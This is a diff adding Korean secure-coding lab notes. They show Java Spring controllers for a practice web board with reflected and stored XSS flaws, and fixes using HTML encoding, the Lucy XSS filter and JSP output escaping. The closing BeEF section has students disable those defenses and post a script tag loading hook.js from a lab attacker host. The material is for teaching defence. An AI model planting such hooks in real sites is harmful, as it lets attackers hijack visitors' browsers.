@@ -1,3 +1,5 @@
+
+
 # 이론수업
 
 ### SDL
@@ -2016,6 +2018,162 @@ Parameterized Query #1
   https://content-security-policy.com/browser-test/
 
 
+
+### Lucy Xss Filter Library
+
+* Eclipse > TestController.java > testXss()
+
+  ```java
+  
+  	@RequestMapping(value = "/test/xss_test.do", method = RequestMethod.POST)
+  	@ResponseBody
+  	public String testXss(HttpServletRequest request) {
+  		StringBuffer buffer = new StringBuffer();
+  		// 진단결과 : 
+  		// 입력값을 아무런 검증없이 출력으로 반환 
+  		// /test/xss_test.do?data=<script>...</script> 형식으로 호출되면
+  		// <script>...</script>가 브라우저로 전달되는 구조
+  		
+  		// 방어대책 : 입력값을 HTML인코딩하여 출력값으로 반환
+  		String data = request.getParameter("data");
+  		if (data != null) {
+  			data = data.replaceAll("<", "&lt;");
+  			data = data.replaceAll(">", "&gt;");
+  		}
+  		buffer.append(data);
+  		return buffer.toString();
+  	}
+  
+  	@RequestMapping(value = "/test/xss_test.do", method = RequestMethod.POST)
+  	@ResponseBody
+  	public String testXss(HttpServletRequest request) {
+  		StringBuffer buffer = new StringBuffer();
+  		// 진단결과 : 
+  		// 입력값을 아무런 검증없이 출력으로 반환 
+  		// /test/xss_test.do?data=<script>...</script> 형식으로 호출되면
+  		// <script>...</script>가 브라우저로 전달되는 구조
+  		
+  		// 방어대책 : 입력값을 HTML인코딩하여 출력값으로 반환
+  		String data = request.getParameter("data");
+  //		// 방법1. 모든 태그에 대해서 일괄되게 HTML 인코딩을 적용
+  //		if (data != null) {
+  //			data = data.replaceAll("<", "&lt;");
+  //			data = data.replaceAll(">", "&gt;");
+  //		}
+  		// 방법2. lucy와 같은 검증된 필터 라이브러리를 사용
+  		// jar 파일을 프로젝트 라이브러리에 등록
+  		// c:\FullstackLAB\download\lucy-xss-filter\lucy-xss-1.1.2.jar
+  		// openeg > WebContent > WEB-INF > lib
+  		
+  		// xml 파일(rule set)을 소스 디렉터리에 복사
+  		// c:\FullstackLAB\download\lucy-xss-filter\lucy-xss-superset.xml
+  		// openeg > Java Resoures > src
+  		
+  		// 인스턴스 생성 후 필터링
+  		XssFilter filter = XssFilter.getInstance("lucy-xss-superset.xml");
+  		data = filter.doFilter(data);
+  		
+  		buffer.append(data);
+  		return buffer.toString();
+  	}
+  ```
+
+* Eclipse > BoardController.java > boardWriteProc()
+
+  ```java
+  @RequestMapping(value = "/write.do", method = RequestMethod.POST)
+  	public String boardWriteProc(@ModelAttribute("BoardModel") BoardModel boardModel, MultipartHttpServletRequest request, HttpSession session) {
+  		String uploadPath = session.getServletContext().getRealPath("/") + "files/";
+  		File dir = new File(uploadPath);
+  		if (!dir.exists()) {
+  			dir.mkdir();
+  		}
+  
+  		MultipartFile file = request.getFile("file");
+  		if (file != null && !"".equals(file.getOriginalFilename())) {
+  			String fileName = file.getOriginalFilename();
+  			File uploadFile = new File(uploadPath + fileName);
+  			if (uploadFile.exists()) {
+  				fileName = new Date().getTime() + fileName;
+  				uploadFile = new File(uploadPath + fileName);
+  			}
+  
+  			try {
+  				file.transferTo(uploadFile);
+  			} catch (Exception e) {
+  				System.out.println("upload error");
+  			}
+  						
+  			boardModel.setFileName(fileName);
+  		}
+  
+  		// 진단! Stored XSS 취약점을 가지고 있다!
+  		// 클라이언트에서 전달된 게시판의 내용에 실행 가능한 스크립트 코드 포함 여부를 확인하지 않고 DB에 저장하고 있다.
+  		// DB에 저장된 스크립트 코드가 지속적으로 사용자 브라우저로 전달되어 실행되게 됨.
+  		
+  		// 대응!
+  		// 게시판 내용의 실행 가능한 스크립트를 HTML 인코딩에서 DB에 저장하도록 수정한다.
+  		
+  		// 게시판 내용 추출
+  		String c = boardModel.getContent();
+  		XssFilter filter = XssFilter.getInstance("lucy-xss-superset.xml");
+  		c = filter.doFilter(c);
+  		boardModel.setContent(c);
+  
+  		String content = boardModel.getContent().replaceAll("\r\n", "<br />");
+  		boardModel.setContent(content);
+  		service.writeArticle(boardModel);
+  
+  		return "redirect:list.do";
+  	}
+  ```
+
+* 게시판 보기를 처리하는 컨트롤러에서 게시판 내용 부분을 lucy를 이용하여 HTML 인코딩 처리Eclipse > BoardController.java > boardView()
+
+  ```java
+  @RequestMapping("/view.do")
+  	public ModelAndView boardView(HttpServletRequest request) {
+  		int idx = Integer.parseInt(request.getParameter("idx"));
+  		// DB에서 읽어온 게시판 정보가 Board라는 객체에 저장
+  		BoardModel board = service.getOneArticle(idx);
+  		
+  		// board 객체에서 게시판 내용을 추출하여 lucy를 이용한 html 인코딩 후 다시 board 객체에 저장
+  		String content = board.getContent();
+  		XssFilter filter = XssFilter.getInstance("lucy-xss-superset.xml");
+  		content = filter.doFilter(content);
+  		board.setContent(content);
+        // 일반적으로 출력해 주는 부분에서 Filtering 한다.
+        
+        service.updateHitcount(board.getHitcount() + 1, idx);
+  
+  		List<BoardCommentModel> commentList = service.getCommentList(idx);
+  
+  		ModelAndView mav = new ModelAndView();
+  		mav.addObject("board", board);
+  		mav.addObject("commentList", commentList);
+  		mav.setViewName("/board/view");
+  		return mav;
+  	}
+  ```
+
+* 입력, 불러오는 부분에서 필터링 하는 것 보다 출력되는 부분에서 필터링 하여보자.
+  openeg/WebContent/WEB-INF/board/view.jsp
+
+  ```jsp
+  <%-- 101라인쯤 --%>
+  <%-- ${board.content} --%>
+  <c:out value="${board.content}" escapeXml="true"/>
+  <%-- 기본적으로 escapeXml은 true값을 가진다. --%>
+  ```
+
+#### BeEF
+
+* XSS 방어 코드를 모드 해제한 후
+  BoardController.java > boardWriteProc, boardView view.jsp > ${board.content}
+* @Kali#2 > 즐겨찾기 > BeEF 선택 > 브라우저가 열리고 BeEF 관리자 콘솔창이 실행 (beef / beef)![img](https://lh4.googleusercontent.com/zOKJTp0vDnqvcoy2ySLIN9OC8_SSgb2XRYy6autEMb5iMoTUg8IY0ygalv6wJCLz3F6O8t1l0FY9k5N8L2BeBHNOfdnSVOvg2-ATzGBUg6QGQNSa0Na7pfaYZg3sE5lhsbf2Q2GC)
+* @WinXP (Proxy 해제 후) > FireFox 실행 후 http://KALI#2_IP:3000/hook.js 로 접속
+* openeg > 게시판 글쓰기에서 아래의 내용을 입력
+  \<script src="http://KALI#2_IP:3000/hook.js">\</script>
 
 
 
